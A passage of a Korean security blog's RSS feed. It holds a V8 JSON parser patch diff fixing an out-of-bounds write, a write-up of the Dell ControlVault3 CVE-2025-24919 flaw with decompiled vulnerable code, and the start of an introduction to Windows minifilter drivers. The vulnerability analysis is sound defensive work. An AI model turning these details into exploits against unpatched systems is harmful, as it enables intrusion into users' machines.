&#xBC18;&#xBCF5;&#xBB38; &#xC548;&#xC5D0; &#xBB38;&#xC790;&#xC5F4; &#xAE38;&#xC774;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB294; &#xB8E8;&#xD2F4;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs diff">diff --git a/src/json/json-parser.cc b/src/json/json-parser.ccindex abc1234..def5678 100644<span class="hljs-comment">--- a/src/json/json-parser.cc</span><span class="hljs-comment">+++ b/src/json/json-parser.cc</span><span class="hljs-meta">@@ -1,26 +1,29 @@</span>   Handle&lt;SeqTwoByteString&gt; intermediate =       factory()-&gt;NewRawTwoByteString(string.length()).ToHandleChecked();   return DecodeString(string, intermediate, hint); }  template &lt;typename Char&gt; template &lt;typename SinkChar&gt; void JsonParser&lt;Char&gt;::DecodeString(SinkChar* sink, uint32_t start,                                     uint32_t length) {<span class="hljs-deletion">-  SinkChar* sink_start = sink;</span>   const Char* cursor = chars_ + start;<span class="hljs-deletion">-  while (true) {</span><span class="hljs-deletion">-    const Char* end = cursor + length - (sink - sink_start);</span><span class="hljs-deletion">-    cursor = std::find_if(cursor, end, [&amp;sink](Char c) {</span><span class="hljs-deletion">-      if (c == &apos;\\&apos;) return true;</span><span class="hljs-deletion">-      *sink++ = c;</span><span class="hljs-deletion">-      return false;</span><span class="hljs-deletion">-    });</span><span class="hljs-deletion">-</span><span class="hljs-deletion">-    if (cursor == end) return;</span><span class="hljs-addition">+  while (length &gt; 0) {</span><span class="hljs-addition">+    // Copy everything until the first escape character</span><span class="hljs-addition">+    const Char* backslash_pos = std::find(cursor, cursor + length, &apos;\\&apos;);</span><span class="hljs-addition">+    size_t to_copy = backslash_pos - cursor;</span><span class="hljs-addition">+    std::copy_n(cursor, to_copy, sink);</span><span class="hljs-addition">+    length -= to_copy;</span><span class="hljs-addition">+    cursor += to_copy;</span><span class="hljs-addition">+    sink += to_copy;</span><span class="hljs-addition">+</span><span class="hljs-addition">+    if (length == 0) return;</span>      cursor++;      switch (GetEscapeKind(character_json_scan_flags[*cursor])) {       case EscapeKind::kSelf:         *sink++ = *cursor;<span class="hljs-addition">+        length--;</span>         break;        case EscapeKind::kBackspace:         *sink++ = &apos;\x08&apos;;<span class="hljs-addition">+        length--;</span>         break;        case EscapeKind::kTab:         *sink++ = &apos;\x09&apos;;<span class="hljs-addition">+        length--;</span>         break;        case EscapeKind::kNewLine:         *sink++ = &apos;\x0A&apos;;<span class="hljs-addition">+        length--;</span>         break;        case EscapeKind::kFormFeed:         *sink++ = &apos;\x0C&apos;;<span class="hljs-addition">+        length--;</span>         break;        case EscapeKind::kCarriageReturn:         *sink++ = &apos;\x0D&apos;;<span class="hljs-addition">+        length--;</span>         break;        case EscapeKind::kUnicode: {         base::uc32 value = 0;         for (int i = 0; i &lt; 4; i++) {           value = value * 16 + base::HexValue(*++cursor);         }         if (value &lt;=             static_cast&lt;base::uc32&gt;(unibrow::Utf16::kMaxNonSurrogateCharCode)) {           *sink++ = value;<span class="hljs-addition">+          length--;</span>         } else {<span class="hljs-addition">+          SBXCHECK_GE(length, 2);</span>           *sink++ = unibrow::Utf16::LeadSurrogate(value);           *sink++ = unibrow::Utf16::TrailSurrogate(value);<span class="hljs-addition">+          length -= 2;</span>         }         break;       }</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse</a></li><li><a href="https://ecma-international.org/publications-and-standards/standards/ecma-404/">https://ecma-international.org/publications-and-standards/standards/ecma-404/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/chrome/">chrome</category>
      
      <category domain="https://hackyboiz.github.io/tags/v8/">v8</category>
      
      <category domain="https://hackyboiz.github.io/tags/json/">json</category>
      
      <category domain="https://hackyboiz.github.io/tags/oob-write/">oob write</category>
      
      <category domain="https://hackyboiz.github.io/tags/d4tura/">d4tura</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/19/d4tura/2025-08-19/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-24919 : Dell ControlVault3의 입력 검증 미흡으로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/08/16/j0ker/2025-08-16/</link>
      <guid>https://hackyboiz.github.io/2025/08/16/j0ker/2025-08-16/</guid>
      <pubDate>Sat, 16 Aug 2025 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://talosintelligence.com/vulnerability_reports</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2025-2153"><strong>Dell ControlVault3 cvhDecapsulateCmd improper input validation vulnerability</strong></a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Broadcom BCM5820X</li><li>Dell ControlVault3 5.14.3.0</li><li>Dell ControlVault3 Driver and Firmware prior to 5.15.10.14</li><li>Dell ControlVault3 Plus Driver and Firmware prior to 6.2.26.36</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Dell ControlVault3&#xC740; &#xC0DD;&#xCCB4;&#xC778;&#xC2DD;, &#xBCF4;&#xC548;&#xCF54;&#xB4DC; &#xB4F1;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xBCF4;&#xC548; &#xC194;&#xB8E8;&#xC158;&#xC73C;&#xB85C;, Windows &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; bcmbipdll.dll &#xB0B4; <code>cvhDecapsulateCmd</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD38C;&#xC6E8;&#xC5B4;&#xC640; &#xD1B5;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; &#xD38C;&#xC6E8;&#xC5B4;&#xC5D0; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xBCF4;&#xB0BC; &#xB54C; <code>InitParam_List</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xB450; &#xAC1C;&#xC758; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xACE0;, &#xBAA8;&#xB450; &#xD0C0;&#xC785;&#xACFC; &#xAE38;&#xC774;&#xB97C; &#xD3EC;&#xD568;&#xD55C; 8&#xBC14;&#xC774;&#xD2B8; &#xD5E4;&#xB354;&#xC640; &#xB370;&#xC774;&#xD130;&#xB85C; &#xC774;&#xB904;&#xC838;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB450; &#xB370;&#xC774;&#xD130;&#xB294; &#xD558;&#xB098;&#xB294; &#xC778;&#xD48B;, &#xD558;&#xB098;&#xB294; &#xC544;&#xC6C3;&#xD48B;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294;&#xB370;, &#xD38C;&#xC6E8;&#xC5B4;&#xB85C;&#xBD80;&#xD130; &#xC804;&#xB2EC;&#xBC1B;&#xB294; &#xC544;&#xC6C3;&#xD48B;&#xC740; <code>cvhDecapsulateCmd</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xB370;&#xC774;&#xD130;&#xAC00; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">cvhDecapsulateCmd</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        cv_out_buffer *encapsulated_cmd, <span class="hljs-comment">//data coming from the firmware</span></span></span><span class="hljs-function"><span class="hljs-params">        cv_session_info *session,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *pNumParams,  <span class="hljs-comment">// ouput of the function, total number of parameters unpacked</span></span></span><span class="hljs-function"><span class="hljs-params">        cv_param_list_entry **dst_params)</span>  <span class="hljs-comment">//[0]</span></span><span class="hljs-function"></span>{    (...) <span class="hljs-comment">// skipped variable definition</span>  dst_params_ = dst_params;  pNumParams_ = pNumParams;  cur_param_num = <span class="hljs-number">0</span>i64;  <span class="hljs-keyword">if</span> ( (encapsulated_cmd-&gt;header.field_A &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> || (decryptedCmdSize = <span class="hljs-number">0</span>, encapsulated_cmd-&gt;header.field_8 == <span class="hljs-number">4</span>) )  {    cur_pos_buffer = &amp;encapsulated_cmd-&gt;first_byte;    v25 = &amp;encapsulated_cmd-&gt;first_byte + encapsulated_cmd-&gt;header.cmd_size;    v39 = v25;    <span class="hljs-keyword">goto</span> SKIP_DECRYPTION;  }    (...) <span class="hljs-comment">// skipped case where data is encrypted</span>SKIP_DECRYPTION:      <span class="hljs-keyword">if</span> ( cur_pos_buffer &gt;= v25 )      {        *pNumParams_ = cur_param_num;        <span class="hljs-keyword">goto</span> DONE;      }      param_type = cur_pos_buffer-&gt;paramType;      <span class="hljs-keyword">if</span> ( cur_pos_buffer-&gt;paramType &gt;= <span class="hljs-number">2</span> &amp;&amp; cur_pos_buffer-&gt;paramType - <span class="hljs-number">2</span> &gt;= <span class="hljs-number">2</span> )   <span class="hljs-comment">// ParamType is between 0 and 3</span>      {        <span class="hljs-keyword">if</span> ( bLoggingStuff )        {          log_more_stuff(            <span class="hljs-string">&quot;d:\\BuildAutomation\\BCMSecurity_int_cs_5.14\\sw\\phoenixII\\host\\windows\\BCMSecurity\\BCMSecurity\\src\\B&quot;</span>            <span class="hljs-string">&quot;CMIDll\\BCMILib_Src\\HelperFunctions.c&quot;</span>);          log_stuff(<span class="hljs-string">&quot;%s %s%s:%d %s\n&quot;</span>, <span class="hljs-string">&quot;Invalid Status Type&quot;</span>, v51, &amp;pNumParams_, <span class="hljs-number">888</span>i64, <span class="hljs-string">&quot;is_valid_param_type&quot;</span>);        }        status_ = INVALID_PARAM_TYPE;        <span class="hljs-keyword">goto</span> DONE;      }      status_ = <span class="hljs-number">0</span>;      status = encapsulated_cmd-&gt;header.status;      <span class="hljs-keyword">if</span> ( !status || status == <span class="hljs-number">143</span> || status == <span class="hljs-number">41</span> || status == <span class="hljs-number">154</span> &amp;&amp; param_type != CV_PACK_MAGIC_BUFFER )      {COPY_PARAM_CONTENT:        Size = <span class="hljs-number">0</span>i64;        param_size = cur_pos_buffer-&gt;paramLen + <span class="hljs-number">8</span>;        decryptedCmdSize = param_size;        v49 = param_size;        param_buffer = j__malloc_base(param_size);    <span class="hljs-comment">// Allocates a buffer with a +8 size to account for the header (type, length)</span>        param_buffer_ = param_buffer;        Size = param_buffer;        <span class="hljs-keyword">if</span> ( !param_buffer )        {          status_ = MEM_ERROR;          free_stuff(&amp;Size, <span class="hljs-number">1u</span>);          <span class="hljs-keyword">goto</span> DONE;        }        <span class="hljs-built_in">memset</span>(param_buffer, <span class="hljs-number">0</span>, param_size);        v32 = param_size;        param_size_aligned = param_size &amp; <span class="hljs-number">0xFFFFFFFC</span>;        param_size_reminder_non_aligned = v32 &amp; <span class="hljs-number">3</span>;        <span class="hljs-keyword">if</span> ( !param_size_reminder_non_aligned )          param_size_aligned = decryptedCmdSize;        v35 = param_buffer_;        <span class="hljs-keyword">if</span> ( param_size_aligned &gt;= <span class="hljs-number">4</span> )        {          memmove(param_buffer_, cur_pos_buffer, param_size_aligned);    <span class="hljs-comment">// [1] copy to param_buffer the parameter entry, including the header coming from the cmd header</span>          v35 = &amp;param_buffer_[param_size_aligned];          Size = &amp;param_buffer_[param_size_aligned];          cur_pos_buffer = (cur_pos_buffer + param_size_aligned);        }</code></pre><p><code>cvhDecapsulateCmd</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xBA3C;&#xC800; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD5E4;&#xB354;&#xC640; &#xD568;&#xAED8; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xD5E4;&#xB354;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xAE38;&#xC774;&#xBCF4;&#xB2E4; 8 &#xD06C;&#xAC8C; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">  <span class="hljs-keyword">if</span> ( param_size_reminder_non_aligned )  {    memmove(v35, cur_pos_buffer, param_size_reminder_non_aligned);    cur_pos_buffer = (cur_pos_buffer + <span class="hljs-number">4</span>);  }  Size = param_buffer_;  v36 = &amp;dst_params_[cur_param_num];  **v36 = <span class="hljs-number">0</span>i64;  memmove(*v36, param_buffer_, v49);   <span class="hljs-comment">//[2] copy the whole parameter entry including its header to the cur_param_num entry of the dst_params buffer (aka the decapsulated parameters) </span>  <span class="hljs-keyword">if</span> ( param_buffer_ )    <span class="hljs-built_in">free</span>(param_buffer_);  <span class="hljs-keyword">goto</span> NEXT_PARAM;}</code></pre><p> [1]&#xC5D0;&#xC11C; &#xBCF5;&#xC0AC;&#xD55C; &#xD5E4;&#xB354; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xCD9C;&#xB825; &#xAD6C;&#xC870;&#xCCB4; &#xB9AC;&#xC2A4;&#xD2B8;&#xB85C; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">           (...) <span class="hljs-comment">// skipped handling of other edge cases</span>NEXT_PARAM:      cur_param_num = (cur_param_num + <span class="hljs-number">1</span>);      cur_param_num_ = cur_param_num;      <span class="hljs-keyword">if</span> ( cur_param_num &gt; <span class="hljs-number">0x18</span> )   <span class="hljs-comment">// [3]  there&apos;s no check if the number of parameters parsed doesn&apos;t go beyond the request number of parameters in *pNumParameters, leading to a potential wild memcpy at [2]</span>      {        status_ = CV_STATUS_TOO_MANY_PARAM;        <span class="hljs-keyword">goto</span> DONE;      }    }  }</code></pre><p>&#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xD38C;&#xC6E8;&#xC5B4;&#xB85C;&#xBD80;&#xD130; &#xC218;&#xC2E0;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xBA74;&#xC11C; 0x18 &#xAC1C; &#xC774;&#xC0C1; &#xBCF5;&#xC0AC;&#xD560; &#xACBD;&#xC6B0; &#xB370;&#xC774;&#xD130; &#xBCF5;&#xC0AC;&#xB97C; &#xC911;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xCD9C;&#xB825; &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;&#xCCB4; &#xB9AC;&#xC2A4;&#xD2B8;&#xC5D0; &#xBA87; &#xAC1C;&#xC758; &#xAD6C;&#xC870;&#xCCB4;&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xC5C8;&#xACE0; &#xBCF5;&#xC0AC;&#xD55C; &#xAC2F;&#xC218;&#xAC00; &#xD574;&#xB2F9; &#xB9AC;&#xC2A4;&#xD2B8; &#xAE38;&#xC774;&#xBCF4;&#xB2E4; &#xB192;&#xC740;&#xC9C0;&#xB294; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xC545;&#xC758;&#xC801;&#xC73C;&#xB85C; &#xC870;&#xC791;&#xB41C; &#xD38C;&#xC6E8;&#xC5B4;&#xC640; &#xD1B5;&#xC2E0;&#xD560; &#xACBD;&#xC6B0;, &#xC774;&#xB97C; &#xD1B5;&#xD574; OOB&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/deserialization/">deserialization</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/Dell/">Dell</category>
      
      <category domain="https://hackyboiz.github.io/tags/ControlVault3/">ControlVault3</category>
      
      <category domain="https://hackyboiz.github.io/tags/cvhDecapsulateCmd/">cvhDecapsulateCmd</category>
      
      <category domain="https://hackyboiz.github.io/tags/bcmbipdll-dll/">bcmbipdll.dll</category>
      
      <category domain="https://hackyboiz.github.io/tags/improper-input-validation/">improper input validation</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/16/j0ker/2025-08-16/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 걸어서 Windows Minifilter Driver 속으로(KR)</title>
      <link>https://hackyboiz.github.io/2025/08/15/banda/Minifilter-Driver/ko/</link>
      <guid>https://hackyboiz.github.io/2025/08/15/banda/Minifilter-Driver/ko/</guid>
      <pubDate>Fri, 15 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;, banda&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. Windows Minifilter Driver &amp;#xAE00;&amp;#xACFC; &amp;#xD568;&amp;#xAED8; &amp;#xC</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, banda&#xC785;&#xB2C8;&#xB2E4;. Windows Minifilter Driver &#xAE00;&#xACFC; &#xD568;&#xAED8; &#xCC98;&#xC74C; &#xC778;&#xC0AC;&#xB4DC;&#xB9BD;&#xB2C8;&#xB2E4;. &#x1F917;</p><p>&#xCD5C;&#xADFC; Windows Kernel Driver&#xC744; &#xACF5;&#xBD80;&#xD558;&#xB2E4;&#xAC00; Bus Driver, Filter Driver, FSD, Minifilter&#xC640; &#xAC19;&#xC740; &#xBAA9;&#xC801;&#xC5D0; &#xB530;&#xB978; &#xB2E4;&#xC591;&#xD55C; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC885;&#xB958;&#xAC00; &#xC788;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xC54C;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.. &#xC800;&#xB294; &#xAE30;&#xC874;&#xC758; Function Driver&#xC640; &#xB2EC;&#xB9AC; Bus Driver&#xC774;&#xB098; Filter Driver&#xC5D0;&#xC11C;&#xC758; &#xAD6C;&#xC870; &#xCC28;&#xC774;&#xC640;, &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC5B4;&#xB5A4; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB098;&#xB294;&#xC9C0; &#xAD81;&#xAE08;&#xD588;&#xB294;&#xB370;&#xC694;.</p><p>&#xC624;&#xB298;&#xC740; Minifilter Driver &#xAD6C;&#xC870;&#xC640; &#xB3D9;&#xC791; &#xBC29;&#xC2DD;, &#xB0B4;&#xBD80; &#xAD6C;&#xC131;&#xC694;&#xC18C;&#xC640; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image1.png" alt></p><h1 id="1-About-Minifilter-Drivers"><a href="#1-About-Minifilter-Drivers" class="headerlink" title="1. About Minifilter Drivers"></a>1. About Minifilter Drivers</h1><hr><p>Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; Windows&#xC5D0;&#xC11C; &#xD30C;&#xC77C; &#xC0DD;&#xC131;, &#xC5F4;&#xAE30;, &#xC77D;&#xAE30;, &#xC4F0;&#xAE30;, &#xC0AD;&#xC81C;&#xC640; &#xAC19;&#xC740; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; I/O &#xC694;&#xCCAD;&#xC744; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xD558;&#xAC70;&#xB098; &#xAC00;&#xB85C;&#xCC44;&#xACE0; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB41C; &#xD2B9;&#xC218;&#xD55C; &#xBAA9;&#xC801;&#xC758; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB85C;, &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xD65C;&#xB3D9;&#xC744; &#xC815;&#xBC00;&#xD558;&#xAC8C; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xD558;&#xB294; &#xB370;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p><strong>&#x201C;&#xD30C;&#xC77C; &#xC811;&#xADFC;&#xC744; &#xAC10;&#xC2DC;&#xD558;&#xACE0;, &#xCC28;&#xB2E8;&#xD558;&#xAC70;&#xB098; &#xC218;&#xC815;&#xD558;&#xB294; &#xAC83;&#x201D;</strong>&#xC744; &#xC0DD;&#xAC01;&#xD574;&#xBCF4;&#xBA74;&#x2026; &#xC7A0;&#xC2DC;&#xB9CC;&#xC694;. <strong>Antivirus, EDR, &#xBC31;&#xC5C5; &#xD504;&#xB85C;&#xADF8;&#xB7A8;</strong>&#xACFC; &#xAC19;&#xC774; &#xAC00;&#xB85C;&#xCC44;&#xACE0; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC8FC; &#xBAA9;&#xC801;&#xC778; &#xC81C;&#xD488;&#xC5D0; &#xC801;&#xD569;&#xD574; &#xBCF4;&#xC774;&#xC9C0; &#xC54A;&#xB098;&#xC694;? &#xB9DE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C;&#xB85C; &#xC0C1;&#xB2F9;&#xC218;&#xC758; &#xD574;&#xB2F9; &#xC81C;&#xD488;&#xB4E4;&#xC774; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC744; &#xC2E4;&#xC81C;&#xB85C; &#xC81C;&#xAC00; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xB294;&#xB370;&#xC694;.</p><p>Minifiler &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xB2E4;&#xC74C; &#xC138; &#xAC00;&#xC9C0; &#xC885;&#xB958;&#xC758; &#xC694;&#xCCAD;&#xC744; &#xAC00;&#xB85C;&#xCC44;&#xAC70;&#xB098; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>IRP (I/O Request Packet)</li><li>Fast I/O</li><li>File System Filter Callbacks</li></ol><h2 id="1-1-Filter-Manager-&#x2192;-Minifilter-&#xD750;&#xB984;"><a href="#1-1-Filter-Manager-&#x2192;-Minifilter-&#xD750;&#xB984;" class="headerlink" title="1.1 Filter Manager &#x2192; Minifilter &#xD750;&#xB984;"></a>1.1 Filter Manager &#x2192; Minifilter &#xD750;&#xB984;</h2><p>Minifilter&#xB294; Windows&#xC758; Filter Manager(<code>fltmgr.sys</code>) &#xC704;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. Filter Manager&#xB294; I/O Manager&#xB85C;&#xBD80;&#xD130; &#xC804;&#xB2EC;&#xB41C; &#xD30C;&#xC77C; I/O &#xC694;&#xCCAD;&#xC744;, &#xB4F1;&#xB85D;&#xB41C; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xAC8C; Altitude &#xC21C;&#xC11C;&#xB85C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. &#xC989;, Altitude&#xB97C; &#xD1B5;&#xD574; &#xB85C;&#xB529; &#xC21C;&#xC11C;&#xB97C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image2.gif" alt></p><p>Windows&#xC5D0;&#xC11C; &#xD30C;&#xC77C; I/O &#xC694;&#xCCAD;&#xC774; &#xCC98;&#xB9AC;&#xB418;&#xB294; &#xD750;&#xB984;&#xC744; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><ol><li>&#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; <code>CreateFile</code>, <code>ReadFile</code>, <code>WriteFile</code>&#xAC19;&#xC740; API&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; I/O &#xC791;&#xC5C5;&#xC744; &#xC694;&#xCCAD;&#xD569;&#xB2C8;&#xB2E4;.</li><li>I/O Manager&#xC774; &#xC774; &#xC694;&#xCCAD;&#xC744; &#xBC1B;&#xC544; Filter Manager(<code>fltmgr.sys</code>)&#xB85C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</li><li>Filter Manager&#xB294; &#xB4F1;&#xB85D;&#xB41C; &#xBAA8;&#xB4E0; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xBAA9;&#xB85D;&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0;, Altitude &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xAC01; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xC694;&#xCCAD;&#xC744; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</li><li>Minifilter&#xC774; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD55C; &#xB4A4;, &#xC694;&#xCCAD;&#xC740; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; Filter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB85C; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xC694;&#xCCAD;&#xC740; &#xB514;&#xC2A4;&#xD06C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;(Storage Driver Stack)&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xC5B4; &#xC2E4;&#xC81C; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAC70;&#xB098; &#xB370;&#xC774;&#xD130;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li></ol><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image3.png" alt></p><p>&#xCC38;&#xACE0;&#xB85C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xB85C;&#xB4DC;&#xB41C; Minifilter &#xBAA9;&#xB85D;&#xC740; cmd&#xCC3D;&#xC758; fltmc &#xBA85;&#xB839;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Altitude &#xAC12;&#xC774; &#xB192;&#xC744;&#xC218;&#xB85D; &#xC6B0;&#xC120;&#xC21C;&#xC704;&#xAC00; &#xB192;&#xC544;&#xC838; I/O &#xC694;&#xCCAD;&#xC744; &#xBA3C;&#xC800; &#xAC00;&#xB85C;&#xCC44;&#xAC70;&#xB098; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E8;, &#xCC98;&#xB9AC; &#xC21C;&#xC11C;&#xB294; &#xC0AC;&#xC804; &#xC5F0;&#xC0B0;, &#xC0AC;&#xD6C4; &#xC5F0;&#xC0B0;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB985;&#xB2C8;&#xB2E4;.</p><ul><li><strong>&#xC0AC;&#xC804; &#xC5F0;&#xC0B0;(Pre-operation)</strong>: Altitude&#xAC00; <strong>&#xB192;&#xC740; &#xC21C;&#xC11C; &#x2192; &#xB0AE;&#xC740; &#xC21C;&#xC11C;</strong>&#xB85C; &#xD638;&#xCD9C;</li><li><strong>&#xC0AC;&#xD6C4; &#xC5F0;&#xC0B0;(Post-operation)</strong>: Altitude&#xAC00; <strong>&#xB0AE;&#xC740; &#xC21C;&#xC11C; &#x2192; &#xB192;&#xC740; &#xC21C;&#xC11C;</strong>&#xB85C; 